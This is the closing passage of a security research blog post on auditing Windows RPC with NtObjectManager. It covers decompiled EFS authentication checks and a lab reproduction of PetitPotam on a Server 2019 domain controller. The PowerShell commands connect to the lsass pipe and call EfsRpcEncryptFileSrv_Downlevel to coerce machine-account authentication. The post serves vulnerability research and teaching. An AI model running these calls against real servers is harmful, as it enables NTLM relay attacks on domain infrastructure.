href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtApiDotNet/Win32/Rpc/Transport/RpcConnectedClientTransport.cs#L49">set</a> RPC <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo">authentication info</a>. To workaround the initial pipe connection issue, we need to setup a remote machine with an account matching that of our client machine. More on that in a bit.</p><h3 id="efsenforceclientauthentication---ensure-packet_privacy"><span class="mr-2">EfsEnforceClientAuthentication - Ensure PACKET_PRIVACY</span><a href="#efsenforceclientauthentication---ensure-packet_privacy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Yet another check was added to <code class="language-plaintext highlighter-rouge">EfsRpcpValidateClientCall</code> in <code class="language-plaintext highlighter-rouge">efslsaext.dll</code> (<em>10.0.22000.556</em>) to check for specific <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo"><em>AuthInfo</em></a> settings for the RPC client connection.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">EfsEnforceClientAuthentication</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">RPC_STATUS</span> <span class="n">RVar1</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">local_res8</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
  <span class="n">RPC_AUTHZ_HANDLE</span> <span class="n">local_res10</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
  
  <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_res10</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">RPC_AUTHZ_HANDLE</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
  <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_res8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">RVar1</span> <span class="o">=</span> <span class="n">RpcBindingInqAuthClientW</span>
                    <span class="p">((</span><span class="n">RPC_BINDING_HANDLE</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="n">local_res10</span><span class="p">,(</span><span class="n">RPC_WSTR</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="n">local_res8</span><span class="p">,(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span>
                     <span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">RVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Check AuthenticationLevel == PACKET_PRIVACY</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">local_res8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">uVar3</span> <span class="o">=</span> <span class="mi">5</span><span class="p">,</span> <span class="n">_DAT_18001a910</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>   
      <span class="n">fnEfsLogTrace1</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">EFS_CLI_AUTH_INSECURE</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
      <span class="n">_DAT_18001a910</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_DAT_18001a910</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">fnEfsLogTrace1</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">EFS_CLI_AUTH_INSECURE</span><span class="p">,</span><span class="n">RVar1</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
      <span class="n">_DAT_18001a910</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Within the <code class="language-plaintext highlighter-rouge">EfsEnforceClientAuthentication</code> the Windows API, <code class="language-plaintext highlighter-rouge">RpcBindingInqAuthClientW</code> <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclientw">parses</a> authentication info from the client connection.</p><div class="language-c++ highlighter-rouge"><div class="code-header"> <span data-label-text="C++"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">RPC_STATUS</span> <span class="nf">RpcBindingInqAuthClientW</span><span class="p">(</span>
  <span class="n">RPC_BINDING_HANDLE</span> <span class="n">ClientBinding</span><span class="p">,</span>
  <span class="n">RPC_AUTHZ_HANDLE</span>   <span class="o">*</span><span class="n">Privs</span><span class="p">,</span>
  <span class="n">RPC_WSTR</span>           <span class="o">*</span><span class="n">ServerPrincName</span><span class="p">,</span>
  <span class="kt">unsigned</span> <span class="kt">long</span>      <span class="o">*</span><span class="n">AuthnLevel</span><span class="p">,</span>
  <span class="kt">unsigned</span> <span class="kt">long</span>      <span class="o">*</span><span class="n">AuthnSvc</span><span class="p">,</span>
  <span class="kt">unsigned</span> <span class="kt">long</span>      <span class="o">*</span><span class="n">AuthzSvc</span>
<span class="p">);</span>
</pre></table></code></div></div><p>This connection check ensures that the <em>AuthenticationLevel</em> is <em>PACKET_PRIVACY</em> (6) for the connection with this line:</p><p><code class="language-plaintext highlighter-rouge">(local_res8[0] != 6)</code></p><p>When we setup our initial connection, we did not specify any of the authentication level required by this check.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\testguy</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="nt">-AuthenticationLevel</span><span class="w"> </span><span class="nx">PacketPrivacy</span><span class="w">
</span></pre></table></code></div></div><h3 id="efsrpcopenfileraw_downlevel-doesnt-exist"><span class="mr-2">EfsRpcOpenFileRaw_Downlevel Doesn’t Exist</span><a href="#efsrpcopenfileraw_downlevel-doesnt-exist" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>OK, so I have lied a bit. The reasons above for procedure call failure are true for most of the “downlevel” functions.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/efslsaext-downlevel-funcs.png" alt="efslsaext-downlevel-funcs" class="shadow" data-proofer-ignore><em>efslsaext downlevel functions</em></p><p>Each procedure that actually provides useful functionality has added the ad hoc security via the <code class="language-plaintext highlighter-rouge">EfsRpcpValidateClientCall</code> check.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/EfsRpcpValidateClientCall-func-call-tree.png" alt="EfsRpcpValidateClientCall-func-call-tree" class="shadow" data-proofer-ignore><em>EfsRpcpValidateClientCall-func-call-tree</em></p><p>It just so happens for <code class="language-plaintext highlighter-rouge">efslsaext.dll</code> (<em>10.0.22000.556</em>) and later, they just remove the <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw_Downlevel</code> procedure functionality.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/EfsRpcOpenFileRaw_Downlevel-decomp.png" alt="EfsRpcOpenFileRaw_Downlevel-decomp" class="shadow" data-proofer-ignore><em>EfsRpcOpenFileRaw_Downlevel Decompliation from Ghidra</em></p><p>For Server 2019 as well:</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/EfsRpcOpenFileRaw_Downlevel-decomp-2019.png" alt="EfsRpcOpenFileRaw_Downlevel-decomp-2019" class="shadow" data-proofer-ignore><em>EfsRpcOpenFileRaw_Downlevel Server 2019 Decompliation from Ghidra</em></p><p>Perhaps they have had enough of <em>Petitpotam</em>. Lucky for PetitPotam, other functions (such as <code class="language-plaintext highlighter-rouge">EfsRpcEncryptFileSrv_Downlevel</code>) that force NTLM relay are still available and a part of <em>PetitPotam</em> current <a href="https://github.com/topotam/PetitPotam/blob/d83ac8f2dd34654628c17490f99106eb128e7d1e/PetitPotam.py#L391">implementation</a>.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/EfsRpcEncryptFileSrv_Downlevel-decomp.png" alt="EfsRpcEncryptFileSrv_Downlevel" class="shadow" data-proofer-ignore><em>EfsRpcEncryptFileSrv_Downlevel Decompliation from Ghidra</em></p><h3 id="all-your-rpc-are-belong-to-ntobjectmanager"><span class="mr-2">All Your RPC are belong to NtObjectManager</span><a href="#all-your-rpc-are-belong-to-ntobjectmanager" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>OK, just to see this work end to end, I setup a Server 2019 domain controller and updated original <code class="language-plaintext highlighter-rouge">efslsaext.dll</code> <em>10.0.17763.1</em> to <em>10.0.17763.2686</em>. This version is still vulnerable to <em>PetitPotam</em>. I had to create a domain user account to match that of my client to make sure my <em>NtObjectManager</em> dynamic client could still connect to the remote pipe despite the <a href="#ntobjectmanager-cheats-with-pipes">hiccup</a>.</p><p>And finally…</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\testguy</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="nt">-StringBinding</span><span class="w"> </span><span class="s2">"ncacn_np:192.168.0.20[\\pipe\\lsass]"</span><span class="w"> </span><span class="nt">-AuthenticationLevel</span><span class="w"> </span><span class="nx">PacketPrivacy</span><span class="w"> </span><span class="nt">-AuthenticationType</span><span class="w"> </span><span class="nx">WinNT</span><span class="w"> </span><span class="nt">-Credentials</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-LsaCredential</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="s2">"testguy"</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="s2">"domain"</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="s2">"password"</span><span class="p">)</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\testguy\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="w">

</span><span class="n">New</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">_Constructors</span><span class="w">
</span><span class="n">NewArray</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">_Array_Constructors</span><span class="w">
</span><span class="n">Connected</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">Endpoint</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">\</span><span class="nf">??</span><span class="nx">\UNC\192.168.0.20\pipe\lsass</span><span class="w">
</span><span class="nx">ProtocolSequence</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w">
</span><span class="nx">ObjectUuid</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w">
</span><span class="n">InterfaceId</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w">
</span><span class="n">InterfaceVersion</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="n">Transport</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">NtApiDotNet.Win32.Rpc.Transport.RpcNamedPipeClientTransport</span><span class="w">
</span></pre></table></code></div></div><p>We are connected. Let’s try <em>PetitPotam</em> vulnerable procedures.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\testguy\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">EfsRpcOpenFileRaw_Downlevel</span><span class="p">(</span><span class="s1">'\\127.0.0.1\C$\Workspace\all-your-RPC-are-belong-to-NtObjectManger.txt'</span><span class="p">,</span><span class="nx">0</span><span class="p">)</span><span class="w">

</span><span class="n">p0</span><span class="w">                                                           </span><span class="nx">retval</span><span class="w">
</span><span class="o">--</span><span class="w">                                                           </span><span class="o">------</span><span class="w">
</span><span class="n">Handle:</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Attributes:</span><span class="w"> </span><span class="nx">0</span><span class="w">      </span><span class="nx">5</span><span class="w">
</span></pre></table></code></div></div><p>The return value for <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw_Downlevel</code> is 5 as expected.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\testguy\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">EfsRpcEncryptFileSrv_Downlevel</span><span class="p">(</span><span class="s1">'\\127.0.0.1\C$\test\all-your-RPC-are-belong-to-NtObjectManger.txt'</span><span class="p">)</span><span class="w">
</span><span class="mi">0</span><span class="w">
</span></pre></table></code></div></div><p>The call to <code class="language-plaintext highlighter-rouge">EfsRpcEncryptFileSrv_Downlevel</code> returns 0 and triggers Petitpotam.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/petitpotam-procmon-ntobjectmanager.png" alt="petitpotam-procmon-ntobjectmanager.png" class="shadow" data-proofer-ignore><em>ProcMon PetitPotam evidence via NtObjectManager</em></p><p>In the <em>Procmon</em> output, you can see the call to <code class="language-plaintext highlighter-rouge">CreateFile</code> from <code class="language-plaintext highlighter-rouge">lsass</code> running as <code class="language-plaintext highlighter-rouge">SYSTEM</code> on the UNC patch specified in your RPC call <code class="language-plaintext highlighter-rouge">EfsRpcEncryptFileSrv_Downlevel</code>. In this way, <em>PetitPotam</em> forces an arbitrary host to authenticate to another machine, best explained by <em>Itm4n</em>:</p><blockquote><p>Of course, the <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> account cannot be used for network authentication. So, when invoking this procedure with a remote path on a domain-joined machine, Windows will actually use the machine account to authenticate on the remote server. This explains why “PetitPotam” is able to coerce an arbitrary Windows host to authenticate to another machine. <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/#:~:text=Of%20course%2C%20the,to%20another%20machine.">from-rpcview-to-petitpotam</a></p></blockquote><p>We made it!</p><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This concludes our journey into RPC auditing with NtObjectManager. If you made it this far, well done. It was a long trek, but hopefully you learned some things along the way.</p><p>NtObjectManager is a powerful tool for RPC auditing and understanding. The ability to generate an RPC client dynamically (with no IDL file or MIDL compiler) and try out procedures on the fly is powerful. It doesn’t mean you won’t run into issues trying to troubleshoot a failed remote procedure call, but if it was easy, would it be fun?</p><p>I hope you have a better idea of the available RPC enumeration tools and perhaps a head start on your next RPC auditing adventure with NtObjectManager.</p><p>Please reach out <a href="https://twitter.com/clearbluejar">@clearbluejar</a> with questions or comments. Also appreciate any <a href="https://github.com/clearbluejar/clearbluejar.github.io/issues/new?assignees=&amp;labels=&amp;template=post-feedback.md&amp;title=%5BFeedback%5D%20From%20NtObjectManager%20to%20PetitPotam">feedback or corrections</a> you might have for the post.</p><p>Cheers again to <a href="https://twitter.com/itm4n">@itm4n</a> for inspiration, <a href="https://twitter.com/topotam77">@topotam</a> for PetitPotam, and <a href="https://twitter.com/tiraniddo">@tiraniddo</a> for NtObjectManager.</p><hr /><p><sub>Cover photo by Leif Linding on Unsplash</sub></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/windows/'>windows</a>, <a href='/categories/rpc/'>rpc</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ntobjectmanager/" class="post-tag no-text-decoration" >ntobjectmanager</a> <a href="/tags/rpcview/" class="post-tag no-text-decoration" >rpcview</a> <a href="/tags/ntlmrelay/" class="post-tag no-text-decoration" >NTLMrelay</a> <a href="/tags/petitpotam/" class="post-tag no-text-decoration" >petitpotam</a> <a href="/tags/c/" class="post-tag no-text-decoration" >C#</a> <a href="/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >ghidra</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=From+NtObjectManager+to+PetitPotam+-+clearbluejar&url=https%3A%2F%2Fclearbluejar.github.io%2Fposts%2Ffrom-ntobjectmanager-to-petitpotam%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=From+NtObjectManager+to+PetitPotam+-+clearbluejar&u=https%3A%2F%2Fclearbluejar.github.io%2Fposts%2Ffrom-ntobjectmanager-to-petitpotam%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fclearbluejar.github.io%2Fposts%2Ffrom-ntobjectmanager-to-petitpotam%2F&text=From+NtObjectManager+to+PetitPotam+-+clearbluejar" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/from-ntobjectmanager-to-petitpotam/">From NtObjectManager to PetitPotam</a><li><a href="/posts/introducing-cve-markdown-charts-part-1/">Introducing CVE Markdown Charts - Part 1</a><li><a href="/posts/mining-google-chrome-cve-data/">Mining Google Chrome CVE data</a><li><a href="/posts/surveying-windows-rpc-discovery-tools/">A Survey of Windows RPC Discovery Tools</a><li><a href="/posts/these-are-your-first-steps/">These Are Your First Steps</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/graphs/">graphs</a> <a class="post-tag" href="/tags/ntlmrelay/">NTLMrelay</a> <a class="post-tag" href="/tags/ntobjectmanager/">ntobjectmanager</a> <a class="post-tag" href="/tags/rpc/">rpc</a> <a class="post-tag" href="/tags/rpcview/">rpcview</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">C#</a> <a class="post-tag" href="/tags/charts/">charts</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/surveying-windows-rpc-discovery-tools/"><div class="card-body"> <em class="small" data-ts="1654146660" data-df="ll" > Jun 2, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A Survey of Windows RPC Discovery Tools</h3><div class="text-muted small"><p> TL;DR A survey of Windows Remote Procedure Call discovery tools and an attempt to understand how open source tools discover RPC servers, interfaces, and procedures. Windows RPC has been a black bo...</p></div></div></a></div><div class="card"> <a href="/posts/cve-north-stars/"><div class="card-body"> <em class="small" data-ts="1661856480" data-df="ll" > Aug 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Introducing CVE North Stars</h3><div class="text-muted small"><p> TL;DR - CVE North Stars is a tutorial that introduces a method to kickstart vulnerability research by treating CVEs as North Stars in vulnerability discovery and comprehension. Background Thi...</p></div></div></a></div><div class="card"> <a href="/posts/mining-google-chrome-cve-data/"><div class="card-body"> <em class="small" data-ts="1652819880" data-df="ll" > May 17, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mining Google Chrome CVE data</h3><div class="text-muted small"><p> TL;DR - The Google Chrome Releases blog provides CVE data one liners containing all the information needed to create a rich CVE data source. Google Chrome CVEs are plentiful and provide informat...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/surveying-windows-rpc-discovery-tools/" class="btn btn-outline-primary" prompt="Older"><p>A Survey of Windows RPC Discovery Tools</p></a> <a href="/posts/cve-north-stars/" class="btn btn-outline-primary" prompt="Newer"><p>Introducing CVE North Stars</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/clearbluejar">clearbluejar</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/graphs/">graphs</a> <a class="post-tag" href="/tags/ntlmrelay/">NTLMrelay</a> <a class="post-tag" href="/tags/ntobjectmanager/">ntobjectmanager</a> <a class="post-tag" href="/tags/rpc/">rpc</a> <a class="post-tag" href="/tags/rpcview/">rpcview</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">C#</a> <a class="post-tag" href="/tags/charts/">charts</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); /* fix mermaid failing to render without refresh */ const toggle = new ModeToggle(); toggle.notify(); /* end fix */ }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QR0Y2106CS"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QR0Y2106CS', {'cookie_expires': 0 }); }); </script>
